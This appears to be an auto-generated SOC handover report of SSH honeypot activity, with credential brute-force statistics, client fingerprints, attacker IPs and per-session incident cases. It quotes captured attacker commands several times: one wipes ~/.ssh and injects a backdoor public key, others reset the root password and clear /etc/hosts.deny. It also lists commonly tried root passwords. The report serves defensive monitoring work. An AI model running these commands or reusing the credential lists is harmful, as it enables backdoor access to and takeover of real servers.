# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-14 |
| **Generated At** | 2026-04-14T09:24:12Z |
| **Shift Time** | 09:24 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **291** |
| Confirmed Threats | **232** |
| False Positives Filtered | **59** (20.3%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **9** |
| High Severity Cases | **107** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **184** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **217** |
| Unique Credential Pairs | **62** |
| Unique Usernames | **23** |
| Unique Passwords | **60** |
| Successful Auth Pairs | **62** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 109 |
| `345gs5662d34` | 52 |
| `steam` | 6 |
| `test1` | 6 |
| `deploy` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 52 |
| `3245gs5662d34` | 52 |
| `123` | 4 |
| `1qaz2wsx3edc#$` | 4 |
| `admin` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 52 |
| `root` | `3245gs5662d34` | 52 |
| `root` | `1qaz2wsx3edc#$` | 4 |
| `test1` | `1qaz2wsx` | 3 |
| `bot` | `Bot05` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Root321@` | `213.225.13.156` | 2026-04-14T07:10:59 |
| `root` | `3245gs5662d34` | `213.225.13.156` | 2026-04-14T07:11:03 |
| `root` | `Qazwsx12@` | `213.225.13.156` | 2026-04-14T07:12:17 |
| `root` | `A12345671` | `213.225.13.156` | 2026-04-14T07:13:34 |
| `root` | `ccAA1234` | `213.225.13.156` | 2026-04-14T07:14:53 |
| `root` | `Qwertyuiop$` | `213.225.13.156` | 2026-04-14T07:17:37 |
| `root` | `Qwer1234@` | `213.225.13.156` | 2026-04-14T07:19:01 |
| `root` | `qazwsx111@#` | `213.225.13.156` | 2026-04-14T07:23:04 |
| `root` | `a1234567b` | `213.225.13.156` | 2026-04-14T07:24:32 |
| `root` | `admin` | `171.231.184.15` | 2026-04-14T07:47:16 |
| `root` | `1qaz2wsx3edc#$` | `122.176.122.24` | 2026-04-14T08:20:54 |
| `root` | `3245gs5662d34` | `122.176.122.24` | 2026-04-14T08:20:56 |
| `root` | `Dh123456` | `220.118.173.234` | 2026-04-14T08:24:34 |
| `root` | `3245gs5662d34` | `220.118.173.234` | 2026-04-14T08:24:37 |
| `root` | `kingkong` | `112.217.188.122` | 2026-04-14T08:25:35 |
| `root` | `3245gs5662d34` | `112.217.188.122` | 2026-04-14T08:25:39 |
| `root` | `dj123456` | `107.175.34.74` | 2026-04-14T08:26:19 |
| `root` | `3245gs5662d34` | `107.175.34.74` | 2026-04-14T08:26:24 |
| `root` | `dj123456` | `112.217.188.122` | 2026-04-14T08:27:24 |
| `root` | `P@ssword12` | `107.175.34.74` | 2026-04-14T08:27:49 |
| `root` | `dj123456` | `220.118.173.234` | 2026-04-14T08:28:06 |
| `root` | `Qazwsx666!@#` | `112.217.188.122` | 2026-04-14T08:29:19 |
| `root` | `MBFFZZKK3D5M` | `220.118.173.234` | 2026-04-14T08:29:43 |
| `root` | `Aa12345` | `14.103.123.16` | 2026-04-14T08:29:57 |
| `root` | `3245gs5662d34` | `14.103.123.16` | 2026-04-14T08:30:03 |
| `root` | `#EDC4rfv%TGB` | `14.103.123.16` | 2026-04-14T08:30:29 |
| `root` | `abc123ABC` | `112.217.188.122` | 2026-04-14T08:31:01 |
| `root` | `QAZwsx!@#456` | `14.103.123.16` | 2026-04-14T08:31:50 |
| `root` | `Qwer!@#123` | `107.175.34.74` | 2026-04-14T08:32:11 |
| `root` | `Root112233!!` | `14.103.123.16` | 2026-04-14T08:32:41 |
| `root` | `Qwer!@#123` | `220.118.173.234` | 2026-04-14T08:33:01 |
| `root` | `mc` | `14.103.123.16` | 2026-04-14T08:33:43 |
| `root` | `Rootroot1234` | `14.103.123.16` | 2026-04-14T08:34:20 |
| `root` | `Welcome2025!` | `14.103.123.16` | 2026-04-14T08:34:53 |
| `root` | `Abcd1234` | `112.217.188.122` | 2026-04-14T08:36:13 |
| `root` | `abc123ABC` | `220.118.173.234` | 2026-04-14T08:36:15 |
| `root` | `zaq1XSW@` | `14.103.123.16` | 2026-04-14T08:36:54 |
| `root` | `123@abc` | `14.103.123.16` | 2026-04-14T08:37:25 |
| `root` | `1qaz!@` | `107.175.34.74` | 2026-04-14T08:38:00 |
| `root` | `testserver` | `14.103.123.16` | 2026-04-14T08:38:56 |
| `root` | `1qaz2wsx3edc#$` | `107.175.34.74` | 2026-04-14T08:39:33 |
| `root` | `MBFFZZKK3D5M` | `112.217.188.122` | 2026-04-14T08:41:30 |
| `root` | `kingkong` | `107.175.34.74` | 2026-04-14T08:42:29 |
| `root` | `Qazwsx666!@#` | `220.118.173.234` | 2026-04-14T08:43:03 |
| `root` | `Y4k1nm4suk.2026` | `185.213.175.140` | 2026-04-14T08:45:10 |
| `root` | `3245gs5662d34` | `185.213.175.140` | 2026-04-14T08:45:14 |
| `root` | `Qazwsx666!@#` | `107.175.34.74` | 2026-04-14T08:45:21 |
| `root` | `hALqjQKTwk` | `101.132.155.153` | 2026-04-14T08:45:58 |
| `root` | `1qaz!@` | `112.217.188.122` | 2026-04-14T08:48:17 |
| `root` | `MBFFZZKK3D5M` | `107.175.34.74` | 2026-04-14T08:50:58 |
| `root` | `P@ssword12` | `220.118.173.234` | 2026-04-14T08:51:20 |
| `root` | `1qaz2wsx3edc#$` | `112.217.188.122` | 2026-04-14T08:53:22 |
| `root` | `abc123ABC` | `107.175.34.74` | 2026-04-14T08:55:23 |
| `root` | `1qaz!@` | `220.118.173.234` | 2026-04-14T08:56:27 |
| `root` | `Abcd1234` | `107.175.34.74` | 2026-04-14T08:56:53 |
| `root` | `kingkong` | `220.118.173.234` | 2026-04-14T08:58:11 |
| `root` | `Dh123456` | `107.175.34.74` | 2026-04-14T08:58:24 |
| `root` | `P@ssword12` | `112.217.188.122` | 2026-04-14T08:58:33 |
| `root` | `1qaz2wsx3edc#$` | `220.118.173.234` | 2026-04-14T09:01:28 |
| `root` | `Qwer!@#123` | `112.217.188.122` | 2026-04-14T09:01:54 |
| `root` | `Abcd1234` | `220.118.173.234` | 2026-04-14T09:03:07 |
| `root` | `Dh123456` | `112.217.188.122` | 2026-04-14T09:03:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **291** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 228 |
| AsyncSSH (Python) | 3 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 222 | 10 |
| `fda360b1b4f4...` | Mirai/variant | 3 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `1b8acd46a07d...` | Modern SSH client | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 222 | 10 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `fda360b1b4f4...` | AsyncSSH (Python) | 3 | 2 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 52 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:1iJzho9qjsGp"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.123.16`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `122.176.122.24`, `14.103.123.16`, `213.225.13.156`, `107.175.34.74`, `185.213.175.140`, `112.217.188.122`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **20** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS7552` | Viettel Group | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | MEDIUM |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS41608` | NextGenWebs, S.L. | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (107)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-75d954d78875

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:10 |
| **Last Seen** | 2026-04-14 07:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:10:58` | `cowrie.session.connect` |
| `2026-04-14 07:10:58` | `cowrie.client.version` |
| `2026-04-14 07:10:58` | `cowrie.client.kex` |
| `2026-04-14 07:10:59` | `cowrie.login.success` |
| `2026-04-14 07:10:59` | `cowrie.session.params` |
| `2026-04-14 07:10:59` | `cowrie.command.input` |
| `2026-04-14 07:10:59` | `cowrie.command.failed` |
| `2026-04-14 07:11:00` | `cowrie.log.closed` |
| `2026-04-14 07:11:00` | `cowrie.session.params` |
| `2026-04-14 07:11:00` | `cowrie.command.input` |
| `2026-04-14 07:11:00` | `cowrie.session.file_download` |
| `2026-04-14 07:11:00` | `cowrie.log.closed` |
| `2026-04-14 07:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e84beee7be

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:11 |
| **Last Seen** | 2026-04-14 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:11:02` | `cowrie.session.connect` |
| `2026-04-14 07:11:03` | `cowrie.client.version` |
| `2026-04-14 07:11:03` | `cowrie.client.kex` |
| `2026-04-14 07:11:03` | `cowrie.login.success` |
| `2026-04-14 07:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4247583047

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:12 |
| **Last Seen** | 2026-04-14 07:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:12:16` | `cowrie.session.connect` |
| `2026-04-14 07:12:16` | `cowrie.client.version` |
| `2026-04-14 07:12:16` | `cowrie.client.kex` |
| `2026-04-14 07:12:17` | `cowrie.login.success` |
| `2026-04-14 07:12:17` | `cowrie.session.params` |
| `2026-04-14 07:12:17` | `cowrie.command.input` |
| `2026-04-14 07:12:17` | `cowrie.command.failed` |
| `2026-04-14 07:12:18` | `cowrie.log.closed` |
| `2026-04-14 07:12:18` | `cowrie.session.params` |
| `2026-04-14 07:12:18` | `cowrie.command.input` |
| `2026-04-14 07:12:18` | `cowrie.session.file_download` |
| `2026-04-14 07:12:18` | `cowrie.log.closed` |
| `2026-04-14 07:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ebc6a7963c

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:12 |
| **Last Seen** | 2026-04-14 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:12:20` | `cowrie.session.connect` |
| `2026-04-14 07:12:20` | `cowrie.client.version` |
| `2026-04-14 07:12:21` | `cowrie.client.kex` |
| `2026-04-14 07:12:21` | `cowrie.login.success` |
| `2026-04-14 07:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-547148b503e8

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:13 |
| **Last Seen** | 2026-04-14 07:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:13:33` | `cowrie.session.connect` |
| `2026-04-14 07:13:33` | `cowrie.client.version` |
| `2026-04-14 07:13:33` | `cowrie.client.kex` |
| `2026-04-14 07:13:34` | `cowrie.login.success` |
| `2026-04-14 07:13:34` | `cowrie.session.params` |
| `2026-04-14 07:13:34` | `cowrie.command.input` |
| `2026-04-14 07:13:34` | `cowrie.command.failed` |
| `2026-04-14 07:13:34` | `cowrie.log.closed` |
| `2026-04-14 07:13:35` | `cowrie.session.params` |
| `2026-04-14 07:13:35` | `cowrie.command.input` |
| `2026-04-14 07:13:35` | `cowrie.session.file_download` |
| `2026-04-14 07:13:35` | `cowrie.log.closed` |
| `2026-04-14 07:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cbe00603368

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:13 |
| **Last Seen** | 2026-04-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:13:37` | `cowrie.session.connect` |
| `2026-04-14 07:13:37` | `cowrie.client.version` |
| `2026-04-14 07:13:37` | `cowrie.client.kex` |
| `2026-04-14 07:13:38` | `cowrie.login.success` |
| `2026-04-14 07:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4c9b5271f6a

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:14 |
| **Last Seen** | 2026-04-14 07:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:14:52` | `cowrie.session.connect` |
| `2026-04-14 07:14:52` | `cowrie.client.version` |
| `2026-04-14 07:14:52` | `cowrie.client.kex` |
| `2026-04-14 07:14:53` | `cowrie.login.success` |
| `2026-04-14 07:14:53` | `cowrie.session.params` |
| `2026-04-14 07:14:53` | `cowrie.command.input` |
| `2026-04-14 07:14:53` | `cowrie.command.failed` |
| `2026-04-14 07:14:53` | `cowrie.log.closed` |
| `2026-04-14 07:14:53` | `cowrie.session.params` |
| `2026-04-14 07:14:53` | `cowrie.command.input` |
| `2026-04-14 07:14:54` | `cowrie.session.file_download` |
| `2026-04-14 07:14:54` | `cowrie.log.closed` |
| `2026-04-14 07:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef4057b16af7

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:14 |
| **Last Seen** | 2026-04-14 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:14:56` | `cowrie.session.connect` |
| `2026-04-14 07:14:56` | `cowrie.client.version` |
| `2026-04-14 07:14:56` | `cowrie.client.kex` |
| `2026-04-14 07:14:57` | `cowrie.login.success` |
| `2026-04-14 07:14:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc288f71ed3

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:17 |
| **Last Seen** | 2026-04-14 07:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:17:36` | `cowrie.session.connect` |
| `2026-04-14 07:17:36` | `cowrie.client.version` |
| `2026-04-14 07:17:36` | `cowrie.client.kex` |
| `2026-04-14 07:17:37` | `cowrie.login.success` |
| `2026-04-14 07:17:37` | `cowrie.session.params` |
| `2026-04-14 07:17:37` | `cowrie.command.input` |
| `2026-04-14 07:17:37` | `cowrie.command.failed` |
| `2026-04-14 07:17:37` | `cowrie.log.closed` |
| `2026-04-14 07:17:38` | `cowrie.session.params` |
| `2026-04-14 07:17:38` | `cowrie.command.input` |
| `2026-04-14 07:17:38` | `cowrie.session.file_download` |
| `2026-04-14 07:17:38` | `cowrie.log.closed` |
| `2026-04-14 07:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2906810423

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
| **First Seen** | 2026-04-14 07:17 |
| **Last Seen** | 2026-04-14 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 07:17:40` | `cowrie.session.connect` |
| `2026-04-14 07:17:40` | `cowrie.client.version` |
| `2026-04-14 07:17:41` | `cowrie.client.kex` |
| `2026-04-14 07:17:41` | `cowrie.login.success` |
| `2026-04-14 07:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.13[.]156` to AbuseIPDB if not already reported
- [ ] Block `213.225.13[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1075f1767d03

| Field | Detail |
|---|---|
| **Source IP** | `213.225.13[.]156` |
